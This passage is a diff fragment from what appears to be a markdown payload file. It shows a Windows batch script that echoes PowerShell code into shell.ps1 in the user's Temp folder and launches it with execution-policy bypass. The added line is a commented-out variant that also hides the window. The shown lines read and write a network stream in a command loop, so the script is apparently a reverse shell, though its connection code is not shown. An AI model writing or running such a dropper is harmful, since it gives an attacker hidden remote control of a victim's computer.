@@ -47,5 +47,6 @@ echo $out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$
 echo $stream.Write($encoding.GetBytes($out),0,$out.length) >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
 echo $out = $null >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
 echo $string = $null}} else {cleanup}} >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
+rem C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -noprofile -executionpolicy bypass -file C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
 C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -noprofile -executionpolicy bypass -file C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
 ```
